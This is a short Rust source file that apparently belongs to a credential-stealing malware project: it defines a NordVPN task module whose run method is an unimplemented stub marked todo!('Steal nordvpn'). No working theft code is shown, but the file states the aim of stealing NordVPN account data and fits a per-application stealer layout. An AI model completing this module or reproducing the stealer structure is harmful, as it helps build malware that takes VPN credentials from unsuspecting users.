use tasks::{parent_name, Task};
use utils::path::Path;

pub(super) struct NordVPN;

impl Task for NordVPN {
    parent_name!("NordVPN");

    unsafe fn run(&self, _parent: &Path) {
        todo!("Steal nordvpn")
    }
}